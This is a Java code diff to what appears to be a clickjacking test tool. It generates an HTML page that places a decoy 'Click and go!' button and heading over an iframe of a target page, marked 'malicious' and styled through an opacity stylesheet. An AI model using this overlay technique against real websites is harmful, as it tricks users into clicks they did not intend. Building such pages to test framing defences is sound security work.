@@ -22,8 +22,16 @@ public class Fictitious2 implements ClickJacking {
 		Fictitious1 fictitious = new Fictitious1(src);
 		fictitious.creation();
         BufferedWriter bw = new BufferedWriter(new FileWriter(f));
-		bw.write("<html><body>");
-	    bw.write("<iframe src =\"" + fictitious.getHtmlFile().getName() + "\" class=\"malicious\"></iframe>");
+        bw.write("<html><head>\r\n"
+        		+ "<link rel=\"stylesheet\" href=\"opacity.css\">\r\n"
+        		+ "    </head>\r\n"
+        		+ "    <body>\r\n"
+        		+ "        <div id=\"content\">\r\n"
+        		+ "            <h1>Malicius Link</h1>\r\n"
+        		+ "            <form action=\"http://www.owasp.com\">\r\n"
+        		+ "                <input type=\"submit\" class=\"button\" value=\"Click and go!\">\r\n"
+        		+ "            </form>");
+	    bw.write("<iframe src =\"" + fictitious.getHtmlFile().getName() + "\"  id=\"clickjacking\" width=\"500\" height=\"500\" scrolling=\"no\" frameborder=\"none\" class=\"malicious\"></iframe>");
 	    bw.write("</body></html>");
 	    bw.close();
 	}
